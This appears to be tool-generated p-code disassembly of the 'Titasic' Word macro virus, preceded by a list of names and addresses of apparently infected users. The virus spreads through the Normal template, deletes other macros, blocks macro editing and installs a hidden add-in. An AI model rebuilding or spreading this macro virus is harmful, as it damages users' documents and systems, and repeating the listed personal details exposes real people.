' Line #162:
' Line #163:
' 	QuoteRem 0x0000 0x0022 " 01:52:36 PM - Monday, 18 Jan 1999"
' Line #164:
' 	QuoteRem 0x0000 0x0010 " David W. Nelson"
' Line #165:
' 	QuoteRem 0x0000 0x0019 " Belden Enterprises, Inc."
' Line #166:
' 	QuoteRem 0x0000 0x0013 " 1835 W. Roscoe St."
' Line #167:
' 	QuoteRem 0x0000 0x0013 " Chicago, IL  60657"
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' 	QuoteRem 0x0000 0x0025 " 11:27:09 AM - Wednesday, 20 Jan 1999"
' Line #172:
' 	QuoteRem 0x0000 0x000D " Tim Henthorn"
' Line #173:
' 	QuoteRem 0x0000 0x0000 ""
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x0024 " 10:34:42 AM - Thursday, 28 Jan 1999"
' Line #178:
' 	QuoteRem 0x0000 0x000E " Shirley Moran"
' Line #179:
' 	QuoteRem 0x0000 0x0000 ""
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x0020 " 11:51:36  - Tuesday, 2 Feb 1999"
' Line #184:
' 	QuoteRem 0x0000 0x000C " Jan Tissera"
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0025 " 11:09:36 AM - Wednesday, 10 Feb 1999"
' Line #190:
' 	QuoteRem 0x0000 0x0014 " SALES AND MARKETING"
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0022 " 03:58:57 PM - Friday, 12 Feb 1999"
' Line #196:
' 	QuoteRem 0x0000 0x0010 " FOOD & BEVERAGE"
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' 	QuoteRem 0x0000 0x0022 " 05:40:20 PM - Friday, 12 Feb 1999"
' Line #202:
' 	QuoteRem 0x0000 0x0010 " FOOD & BEVERAGE"
' Line #203:
' 	QuoteRem 0x0000 0x0000 ""
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0024 " 12:18:32 AM - Wednesday, 1 Jan 1997"
' Line #208:
' 	QuoteRem 0x0000 0x0018 " Ricardo Calixto Gomecua"
' Line #209:
' 	QuoteRem 0x0000 0x0014 " FR. BENILDA GOMECUA"
' Line #210:
' 	QuoteRem 0x0000 0x0015 "       142 FORTUNA ST"
' Line #211:
' 	QuoteRem 0x0000 0x0016 "       PASAY CITY M.M."
' Line #212:
' 	QuoteRem 0x0000 0x0012 "       PHILIPPINES"
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x0023 " 07:59:16 PM - Thursday, 4 Mar 1999"
' Line #217:
' 	QuoteRem 0x0000 0x0005 " john"
' Line #218:
' 	QuoteRem 0x0000 0x0000 ""
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' 	QuoteRem 0x0000 0x0022 " 10:28:43 AM - Tuesday, 9 Mar 1999"
' Line #223:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #224:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0021 " 05:30:17 PM - Sunday, 7 Mar 1999"
' Line #229:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #230:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x0024 " 10:51:44 AM - Wednesday, 3 Feb 1999"
' Line #235:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #236:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' 	QuoteRem 0x0000 0x0023 " 11:35:29 AM - Tuesday, 26 Jan 1999"
' Line #241:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #242:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' 	QuoteRem 0x0000 0x0024 " 06:26:43 AM - Thursday, 18 Mar 1999"
' Line #247:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #248:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0024 " 06:36:03 PM - Saturday, 20 Mar 1999"
' Line #253:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #254:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' 	QuoteRem 0x0000 0x0021 " 03:44:39 AM - Sunday, 4 Apr 1999"
' Line #259:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #260:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' 	QuoteRem 0x0000 0x0022 " 02:05:58 PM - Tuesday, 6 Apr 1999"
' Line #265:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #266:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x0024 " 02:49:10 PM - Saturday, 10 Apr 1999"
' Line #271:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #272:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' 	QuoteRem 0x0000 0x0024 " 12:31:07 PM - Saturday, 16 Feb 1980"
' Line #277:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #278:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #279:
' Line #280:
' Line #281:
' Line #282:
' 	QuoteRem 0x0000 0x0023 " 08:44:52 AM - Tuesday, 25 May 1999"
' Line #283:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #284:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' 	FuncDefn (Private Sub ToggleButton1_Click())
' Line #289:
' Line #290:
' 	EndSub 
' Line #291:
' 	QuoteRem 0x0000 0x0024 " 03:41:35 PM - Wednesday, 9 Jun 1999"
' Line #292:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #293:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #294:
' Line #295:
' Line #296:
' Line #297:
' 	QuoteRem 0x0000 0x0022 " 10:29:55 PM - Tuesday, 3 Aug 1999"
' Line #298:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #299:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #300:
' Line #301:
' Line #302:
' Line #303:
' 	QuoteRem 0x0000 0x0022 " 11:28:43 AM - Friday, 10 Sep 1999"
' Line #304:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #305:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #306:
' Line #307:
' Line #308:
' Line #309:
' 	QuoteRem 0x0000 0x0021 " 10:45:00 AM - Friday, 8 Oct 1999"
' Line #310:
' 	QuoteRem 0x0000 0x001F " San Miguel Brewing Philippines"
' Line #311:
' 	QuoteRem 0x0000 0x0000 ""
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' 	QuoteRem 0x0000 0x0025 " 01:23:48 PM - Wednesday, 24 Nov 1999"
' Line #316:
' 	QuoteRem 0x0000 0x0005 " polo"
' Line #317:
' 	QuoteRem 0x0000 0x0000 ""
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' 	QuoteRem 0x0000 0x0023 " 02:09:19 PM - Tuesday, 21 Dec 1999"
' Line #322:
' 	QuoteRem 0x0000 0x0012 " archie b. gupalor"
' Line #323:
' 	QuoteRem 0x0000 0x0000 ""
' Line #324:
' Line #325:
' Line #326:
' Line #327:
' 	QuoteRem 0x0000 0x0022 " 10:06:09 AM - Friday, 10 Mar 2000"
' Line #328:
' 	QuoteRem 0x0000 0x0012 " Ulysses R. Gotera"
' Line #329:
' 	QuoteRem 0x0000 0x001B " FoxChit SOFTWARE SOLUTIONS"
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' 	QuoteRem 0x0000 0x0024 " 04:46:18 PM - Saturday, 25 Mar 2000"
' Line #334:
' 	QuoteRem 0x0000 0x000B " Bill Gates"
' Line #335:
' 	QuoteRem 0x0000 0x0000 ""
' Line #336:
' Line #337:
' Line #338:
' Line #339:
' 	QuoteRem 0x0000 0x0022 " 12:39:44 PM - Friday, 27 Oct 2000"
' Line #340:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #341:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #342:
' Line #343:
' Line #344:
' Line #345:
' 	QuoteRem 0x0000 0x0022 " 12:58:13 PM - Friday, 10 Nov 2000"
' Line #346:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #347:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' 	QuoteRem 0x0000 0x0025 " 01:45:41 PM - Wednesday, 15 Nov 2000"
' Line #352:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #353:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' 	QuoteRem 0x0000 0x0023 " 01:05:28 PM - Thursday, 8 Feb 2001"
' Line #358:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #359:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #360:
' Line #361:
' Line #362:
' Macros/VBA/astia - 12837 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #1:
' 	Dim (Public) 
' 	VarDefn NonTitasic (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #2:
' 	FuncDefn (Function AstMaster())
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' Line #4:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #5:
' 	Dim 
' 	VarDefn aSrc
' Line #6:
' 	OnError selesai 
' Line #7:
' 	LitStr 0x0005 "astia"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #8:
' 	LitStr 0x0007 "TITASIC"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #9:
' Line #10:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #11:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #12:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #13:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #14:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #15:
' 	Ld NT 
' 	St aSrc 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #20:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #21:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #22:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #23:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #24:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	St aSrc 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #28:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #29:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0005 "astia"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #30:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Mcopy 0x0003 
' Line #31:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #32:
' 	LitStr 0x0005 "astia"
' 	MemStWith Description 
' Line #33:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #35:
' 	Ld NT 
' 	St CustomizationContext 
' Line #36:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #37:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #38:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #41:
' 	ElseBlock 
' Line #42:
' 	GoTo Aksi 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndWith 
' Line #45:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #46:
' 	ArgsCall Refresh 0x0000 
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	Label Aksi 
' Line #49:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #50:
' 	ExitFunc 
' Line #51:
' 	Label selesai 
' Line #52:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Terimakasih Anda Telah"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "Memproteksi Word dengan Aman"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0007 "Titasic"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #53:
' 	EndFunc 
' Line #54:
' Line #55:
' 	FuncDefn (Sub Mhapus(Sfile))
' Line #56:
' 	Dim 
' 	VarDefn nmak (As Object)
' Line #57:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #58:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonTitasic 
' 	EndIf 
' Line #59:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0005 "astia"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0007 "TITASIC"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #60:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #61:
' 	Ld reset 
' 	IfBlock 
' Line #62:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub Mcopy(Sfile, Dfile, nmak))
' Line #70:
' 	Dim 
' 	VarDefn aNmak
' Line #71:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #72:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub Action())
' Line #76:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #79:
' 	LitStr 0x0007 "Titasic"
' 	MemStWith Caption 
' Line #80:
' 	LitDI2 0x0064 
' 	MemLdWith ActivePane 
' 	MemLd View 
' 	MemLd Zoom 
' 	MemSt Percentage 
' Line #81:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #82:
' 	LitVarSpecial (False)
' 	MemStWith DisplayRulers 
' Line #83:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #84:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #86:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt ShowTextBoundaries 
' Line #87:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Position 
' Line #88:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	With 
' Line #89:
' 	LitStr 0x0008 "Titasic,"
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	MemStWith Caption 
' Line #90:
' 	LitDI2 0x0003 
' 	MemStWith Style 
' Line #91:
' 	LitDI2 0x0119 
' 	MemStWith FaceId 
' Line #92:
' 	EndWith 
' Line #93:
' 	LitDI2 0x0006 
' 	MemLdWith View 
' 	MemSt TypeOf 
' Line #94:
' 	ArgsCall Read 0x0000 
' Line #95:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	With 
' Line #96:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #97:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemCallWith PresetGradient 0x0003 
' Line #98:
' 	EndWith 
' Line #99:
' 	Ld TITASIC 
' 	ArgsMemCall Show 0x0000 
' Line #100:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #101:
' 	EndWith 
' Line #102:
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #103:
' 	ArgsCall WBT 0x0000 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #105:
' 	ArgsCall WBF 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub FileOpen())
' Line #108:
' 	ArgsCall WBT 0x0000 
' Line #109:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #110:
' 	ArgsCall WBF 0x0000 
' Line #111:
' 	ArgsCall AutoOpen 0x0000 
' Line #112:
' 	ElseBlock 
' Line #113:
' 	ArgsCall WBF 0x0000 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Sub AutoOpen())
' Line #118:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #119:
' 	ArgsCall AstMaster 0x0000 
' Line #120:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #122:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #123:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #124:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #125:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #126:
' 	ArgsCall AstMaster 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Next 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld Now 
' 	LitDI2 0x07CE 
' 	LitDI2 0x0009 
' 	LitDI2 0x000A 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:45:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000C "astia.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #131:
' 	End 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub ViewVbCode())
' Line #134:
' 	LineCont 0x0008 15 00 00 00 31 00 00 00
' 	LitStr 0x0006 "Maaf.."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x004C "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro Titasic..!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "Anda hanya bisa merekam makro, menyimpan, menggunakan"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "serta menghapus makro buatan Anda"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 " Apakah Anda ingin merekam makro..?"
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0007 "Titasic"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "%m%s{down}~%d'Macro non-Titasic'%m"
' 	ArgsCall SendKeys 0x0001 
' 	EndIf 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub AutoExec())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #139:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #140:
' 	ArgsCall AstMaster 0x0000 
' Line #141:
' 	ArgsCall WBT 0x0000 
' Line #142:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #143:
' 	ArgsCall WBF 0x0000 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub AutoExit())
' Line #148:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #149:
' 	OnError batal 
' Line #150:
' 	ArgsCall WBT 0x0000 
' Line #151:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #152:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #153:
' 	LitVarSpecial (True)
' 	St afound 
' Line #154:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #155:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #156:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' Line #158:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #159:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #160:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #161:
' 	ArgsCall AstMaster 0x0000 
' Line #162:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #163:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #164:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #165:
' 	EndWith 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #168:
' 	Label batal 
' Line #169:
' 	ArgsCall WBF 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub ToolsMacro())
' Line #172:
' 	ArgsCall WBF 0x0000 
' Line #173:
' 	OnError batal 
' Line #174:
' 	Ld ActiveDocument 
' 	ArgsCall Mhapus 0x0001 
' Line #175:
' 	Ld NonTitasic 
' 	IfBlock 
' Line #176:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0011 ".astia.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #177:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #178:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #179:
' 	LitStr 0x0076 "Macros Titasic mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Titasic')"
' 	MemStWith Description 
' Line #180:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
